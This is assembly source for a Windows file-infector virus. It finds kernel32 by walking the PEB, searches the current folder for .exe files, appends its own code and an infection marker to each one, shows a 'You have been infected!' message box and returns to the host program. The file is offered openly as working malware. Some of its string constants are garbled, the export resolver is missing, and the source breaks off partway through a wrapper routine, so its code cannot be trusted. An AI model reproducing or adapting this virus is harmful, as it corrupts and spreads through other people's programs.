
.386
.model flat, stdcall
option casemap:none

; ---------------- helper constant offsets ------------------
PEB_LdrOffset      equ 12   ; PEB->Ldr   
LDR_InInitOffset   equ 28   ; _PEB_LDR_DATA.InInitializationOrderModuleList   
LDR_DllBaseOffset  equ 24   ; _LDR_DATA_TABLE_ENTRY.DllBase   
LDR_BaseNameOffset equ 44   ; _LDR_DATA_TABLE_ENTRY.BaseDllName.Buffer   
IMAGE_DOS_e_lfanew equ 60   ; e_lfanew   
OPTIONAL_EPT       equ 40   ; AddressOfEntryPoint inside OptionalHeader   
WIN32_FIND_DATA_sz equ 608  ; minimal buffer for filename  
INVALID_HANDLE     equ -1
GEN_READ_WRITE     equ 128 or 64
FILE_SHARE_R       equ 1
OPEN_EXISTING      equ 3
FILE_END_PTR       equ 2

; -------------- R/W fields embedded in code ---------------
msgBoxPtr  dd 0
getProcPtr dd 0
loadLibPtr dd 0
markerTxt  db 'INFCTED',0
origOEP    dd 0
selfSize   dd 0

; ----------------------------------------------------------
.code
shell_begin label byte
start:
    ; === 1. Locate kernel32 base ===
    xor     eax,eax
    mov     eax,fs:[48]
    mov     eax,[eax+PEB_LdrOffset]
    mov     esi,[eax+LDR_InInitOffset]
find_k32:
    mov     ebx,[esi+LDR_DllBaseOffset]
    mov     edi,[esi+LDR_BaseNameOffset]
    mov     ax,[edi]
    or      ax,2020h
    cmp     ax,'k'            ; "k"
    jne     next_mod
    cmp     dword ptr [edi+2],0065006Eh ; "ernel"
    jne     next_mod
    jmp     got_k32
next_mod:
    mov     esi,[esi]         ; Flink (đầu của mỗi node có cấu trúc { Flink, Blink })
    jmp     find_k32          ; Quay lại find_k32 để kiểm tra xem DLL kế tiếp có phải kernel32.dll không

; === 2. Resolve GetProcAddress / LoadLibraryA ===
got_k32:
    push    ebx               ; kernel32 base
    call    resolve_exports   ; EAX=GetProc, EDX=LoadLib
    mov     [getProcPtr], eax
    mov     [loadLibPtr], edx

; === 3. Load user32 & MessageBoxA ===
    sub     esp,12
    mov     dword ptr [esp],6C6C642Eh ; "dll."
    mov     dword ptr [esp+4],32337265h; "er32"
    mov     dword ptr [esp+8],007375h  ; "us"
    push    esp
    call    edx               ; LoadLibraryA
    add     esp,16
    mov     ebx,eax           ; user32 base

    sub     esp,12
    mov     dword ptr [esp],41736F4Dh ; "Mosa"
    mov     dword ptr [esp+4],78656B73h; "skex"
    mov     dword ptr [esp+8],00000042h; "B"
    push    esp
    push    ebx
    call    eax               ; GetProcAddress
    add     esp,16
    mov     [msgBoxPtr], eax

; === 4. Calculate self size ===
    call    $+5
    pop     esi               ; ESI = current EIP
    lea     edi, shell_end
    sub     edi, esi
    mov     [selfSize], edi

; === 5. Save host OEP ===
    mov     eax,fs:[30h]
    mov     eax,[eax+16]
    mov     ecx,[eax+IMAGE_DOS_e_lfanew]
    mov     ecx,[eax+ecx+OPTIONAL_EPT]
    add     ecx,eax
    mov     [origOEP], ecx

; === 6. Cross‑infect *.exe ===
    ; build "*.exe" string
    sub     esp,8
    mov     dword ptr [esp],6578652Ah ; "*.ex"
    mov     dword ptr [esp+4],000065
    push    esp               ; lpFileName
    sub     esp,WIN32_FIND_DATA_sz
    mov     edi,esp           ; WIN32_FIND_DATA buffer
    push    edi               ; lpFindFileData
    call    find_first
    add     esp,WIN32_FIND_DATA_sz+8
    mov     ebx,eax           ; hFind

infect_loop:
    cmp     ebx,INVALID_HANDLE
    je      infect_done
    lea     esi,[edi+44]     ; filename
    push    0
    push    GEN_READ_WRITE
    push    OPEN_EXISTING
    push    0
    push    FILE_SHARE_R
    push    esi
    call    create_file
    mov     ecx,eax           ; hFile
    cmp     eax,INVALID_HANDLE
    je      next_file
    sub     esp,32
    push    0
    lea     edx,[esp]
    push    edx
    push    32
    push    ecx
    call    read_file
    mov     edx,esp           ; buffer start
    mov     edi,offset markerTxt
scan_loop:
    mov     al,[edx]
    cmp     al,0
    je      not_infected
    cmp     al,[edi]
    je      already_inf
    inc     edx
    jmp     scan_loop
already_inf:
    add     esp,32
    push    ecx
    call    close_handle
    jmp     next_file
not_infected:
    ; move to EOF
    push    0
    push    0
    push    FILE_END_PTR
    push    ecx
    call    set_ptr
    ; write shellcode
    push    0
    push    [selfSize]
    push    esi               ; shell_begin address
    push    ecx
    call    write_file
    ; write marker
    push    0
    push    7
    push    offset markerTxt
    push    ecx
    call    write_file
    add     esp,32
    push    ecx
    call    close_handle
next_file:
    push    edi
    push    ebx
    call    find_next
    mov     ebx,eax
    jmp     infect_loop
infect_done:
    push    ebx
    call    find_close

; === 7. Payload ===
    ; -- caption "Alert" --
    sub     esp, 8
    mov     dword ptr [esp], 7465726Ch   ; "trel" (little‑endian for "lert")
    mov     dword ptr [esp+4], 00000041h ; "A" + NULLs to finish "Alert"
    lea     ebx, [esp]                   ; EBX = ptr caption

    ; -- text "You have been infected!" --
    sub     esp, 24
    mov     dword ptr [esp],    206F7559h ; "You "
    mov     dword ptr [esp+4],  65766168h ; "have"
    mov     dword ptr [esp+8],  65656220h ; " bee"
    mov     dword ptr [esp+12], 6E69206Eh ; "n in"
    mov     dword ptr [esp+16], 74636566h ; "fect"
    mov     dword ptr [esp+20], 00216465h ; "ed! + NULLs"
    lea     ecx, [esp]                   ; ECX = ptr text

    push    0            ; uType = MB_OK (0)
    push    ebx          ; lpCaption = "Alert"
    push    ecx          ; lpText    = "You have been infected!"
    push    0            ; hWnd = NULL
    call    [msgBoxPtr]

    add     esp, 32      ; clean caption(8) + text(24) bytes

; === 8. Return to OEP ===
    jmp     [origOEP]

; ---------------- wrappers --------------------
find_first proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],6C694646h
    mov     dword ptr [esp+4],74697273h
    mov     dword ptr [esp+8],00000041h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_first endp

find_next proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],65446E69h
    mov     dword ptr [esp+4],6C694679h
    mov     dword ptr [esp+8],00006574h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_next endp

find_close proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],6F6C4372h
    mov     dword ptr [esp+4],61466964h
    mov     dword ptr [esp+8],00006573h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
find_close endp

create_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],65446E69h
    mov     dword ptr [esp+4],69466574h
    mov     dword ptr [esp+8],00656C69h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
create_file endp

read_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],69466552h
    mov     dword ptr [esp+4],00656C69h
    mov     dword ptr [esp+8],0
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
read_file endp

write_file proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],69574652h
    mov     dword ptr [esp+4],656C6974h
    mov     dword ptr [esp+8],00000065h
    push    esp
    push    [loadLibPtr]
    call    [getProcPtr]
    add     esp,16
    jmp     eax
write_file endp

set_ptr proc
    push    ebp
    mov     ebp,esp
    sub     esp,12
    mov     dword ptr [esp],72507453h
    mov     dword ptr [esp+4],72657469
